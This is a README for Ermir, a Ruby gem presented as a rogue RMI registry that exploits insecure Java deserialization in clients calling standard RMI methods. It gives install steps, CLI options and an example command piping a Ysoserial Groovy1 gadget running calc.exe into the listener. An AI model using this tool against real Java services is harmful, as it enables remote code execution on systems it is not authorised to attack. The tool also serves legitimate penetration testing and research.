# Ermir

Ermir is an Evil/Rogue RMI Registry, it exploits unsecure deserialization on any Java code calling standard RMI methods on it (`list()`/`lookup()`/`bind()`/`rebind()`/`unbind()`).

# Requirements

- Ruby v3.0.3 or newer.

## Installation

Install Ermir from rubygems.org:

    $ gem install ermir

or clone the repo and build the gem:

    $ git clone https://github.com/hakivvi/ermir.git
    $ rake install

## Usage

Ermir is a cli gem, it comes with 2 cli files, `ermir` and `gadgetmarshal`, `ermir` is the actual gem and the latter is just a pretty interface to `GadgetMarshaller.java` file which rewrites the gadgets of Ysoserial to match `MarshalInputStream` requirements, the output should be then piped into `ermir` or a file.

`ermir` usage:
```text
Ermir by @hakivvi * https://github.com/hakivvi/ermir.
Info:
    Ermir is a Rogue/Evil RMI Registry which exploits unsecure Java deserialization on any Java code calling standard RMI methods on it.
Usage: ermir [options]
    -l, --listen   bind the RMI Registry to this ip and port (default: 0.0.0.0:1099).
    -f, --file     path to file containing the gadget to be deserialized.
    -p, --pipe     read the serialized gadget from the standard input stream.
    -v, --version  print Ermir version.
    -h, --help     print options help.
Example:
    $ gadgetmarshal /path/to/ysoserial.jar Groovy1 calc.exe | ermir --listen 127.0.0.1:1099 --pipe
```
`gadgetmarshal` usage:
```text
Usage: gadgetmarshal /path/to/ysoserial.jar Gadget1 cmd (optional)/path/to/output/file
```

## Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/hakivvi/ermir. This project is intended to be a safe, welcoming space for collaboration, and contributors are expected to adhere to the [code of conduct](https://github.com/[USERNAME]/ermir/blob/master/CODE_OF_CONDUCT.md).

## License

The gem is available as open source under the terms of the [MIT License](https://opensource.org/licenses/MIT).

## Code of Conduct

Everyone interacting in the Ermir project's codebases, issue trackers, chat rooms and mailing lists is expected to follow the [code of conduct](https://github.com/hakivvi/ermir/blob/master/CODE_OF_CONDUCT.md).
